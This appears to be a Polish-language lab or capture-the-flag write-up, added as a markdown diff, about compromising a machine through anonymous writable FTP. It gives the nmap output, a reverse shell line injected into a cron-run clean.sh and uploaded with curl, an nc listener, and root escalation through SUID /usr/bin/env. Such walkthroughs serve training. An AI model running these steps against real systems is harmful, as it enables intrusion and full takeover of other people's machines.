@@ -1,0 +1,144 @@
+Projekt 2 - wykorzystanie usługi FTP.
+
+Na poczatek wykonuje skanowanie za pomoca nmap:
+```
+sudo nmap -sC -sV 10.10.47.212
+```
+
+Nmap scan report for 10.10.47.212
+Host is up (0.046s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.0.8 or later
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.18.105.140
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
+|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
+|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 13s, deviation: 0s, median: 12s
+|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: unknown, NetBIOS MAC: unknown (unknown)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time: 
+|   date: 2022-09-20T12:27:43
+|_  start_date: N/A
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: anonymous
+|   NetBIOS computer name: ANONYMOUS\x00
+|   Domain name: \x00
+|   FQDN: anonymous
+|_  System time: 2022-09-20T12:27:43+00:00
+
+Okazuje się że jest możliwe zalogowanie sięjako **ANONYMOUS** na FTP.
+
+*smbclient -L 10.10.47.212*
+
+*ftp 10.10.47.212*
+login: anonymous
+password: click enter (puste hasło)
+
+*Przesłanie plikow na Kali Linux*
+```
+mget *
+y
+y
+y
+lub 
+get clean.sh
+get removed_files.log
+get to_do.txt
+
+Wyjscie z ftp
+cat clean.sh
+cat to_do.txt
+help - sprawdzanie komend ktorych mozna uzyc do uruchomienia pliku
+Wyjsc z ftp
+
+```
+
+
+Kilka rzeczy, na które należy zwrócić uwagę:
+
+1.  Plik dziennika zawiera kilka wierszy. Prawdopodobnie dlatego, że 
+	skrypt działał kilka razy (prawdopodobnie zadanie cron, co minutę)
+1.  Katalog jest zapisywalny.`scripts`
+
+**To_do.txt** tylko przypomnienie, że właściciel maszyny musi wyłączyć logowanie anonimowe
+
+**Clean.sh** jest skrypt bash, który usuwa pliki znajdujące się w katalogu /tmp
+
+**removed_files.log** jest plikiem dziennika pokazującym, czy pliki zostały usunięte z katalogu /
+
+*Zastąpienie skryptu odwrotną powłoką:*
+*Kali Linux*
+```
+nano clean.sh
+``` 
+Zastapic w skrypcie:
+```
+then
+		bash -i >& /dev/tcp/Kali Linux/4444 0>&1
+else
+```
+
+*Kali Linux*
+```
+curl ftp://adres IP ofiary/scripts/clean.sh –upload-file clean.sh –append
+```
+
+*W drugim oknie Kali Linux:*
+```
+nc -nlvp 4444
+```
+
+*Ponowne zalogowanie sie na:*
+```
+ftp ip address
+login: anonymous
+password: click enter
+```
+
+*Zdobywanie roota:*
+Zidentyfikować pliki binarne z ustawionym bitem SUID za pomocą polecenia find 
+```
+find / -perm -4000 2> /dev/null
+``` 
+Więc można go użyć do eskalacji uprawnień do roota.
+
+Sprawdzic strone **gtfobins**, aby określić, które pliki binarne i ich odpowiednie polecenia należy użyć do eskalacji uprawnień. 
+Po przejrzeniu listy zidentyfikowanych plików binarnych większość (np. mount itp.) z nich wymagała sudo (i hasła, którego nie mam). 
+Jedyną opcją, która nie wymaga sudo, było **"/usr/bin/env"**.
+
+*Wprowadzic to polecenie do terminala aby uzyskac uprawnienia administratora.*
+```
+/usr/bin/env /bin/sh -p
+Uzyskano uprawnienia roota.
+cd root
+```
